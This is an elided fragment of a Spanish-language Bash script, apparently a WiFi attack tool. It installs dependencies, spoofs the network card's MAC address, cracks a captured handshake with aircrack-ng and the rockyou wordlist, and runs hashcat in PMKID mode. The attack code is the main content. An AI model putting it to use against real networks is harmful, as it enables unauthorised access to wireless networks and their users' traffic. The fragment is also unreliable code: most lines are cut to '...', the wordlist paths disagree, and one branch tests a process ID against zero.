...
function helpPanel(){
	echo -e "\n${yellowColour}[*]${endColour} Uso: ./Scripting.sh${endColour}"
	...
	echo -e "\t${purpleColour}n)${endColour}${yellowColour} Nombre de la targeta de red${endColour}"
...
function dependencies(){
	...
	echo -e "${yellowColour}[*]${endColour} Comprobando programas necesarios...${endColour}"
	sleep 2
	...
	for program in "${dependencies[@]}"; do
		...
		if [ "$(echo $?)" == "0" ]; then
			...
			echo -e " ${yellowColour}[*]${endColour}${greyColour}Instalando herramienta ${endColour}${blueColour}$program${endColour}${yellowColour}...${endColour}"
...
function startAttack(){
	clear
	echo -e "${yellowColour}[*]${endColour} Configurando targeta de red...${endColour}\n"	
	...
	echo -e "${yellowColour}[*]${endColour}${grayColour} Nueva direccion MAC ${endColour}${purpleColour}(${endColour}${blueColour}$(macchanger -s ${networkCard}mon | grep -i current | xargs | cut -d ' ' -f '3-100')${endColour}${purpleColour})${endColour}"
	...
	if [ "$(echo $attack_mode)" == "Handshake" ]; then 
		...
		xterm -hold -e "aircrack-ng -w /usr/share/worldlists/rockyou.txt Captura-01.cap" &
		...
		if [ "$(echo $!)" == "0" ]; then
			...
			hashcat -m 16800 /usr/share/worldlist/rockyou.txt myHashes -d 1 --force
		else
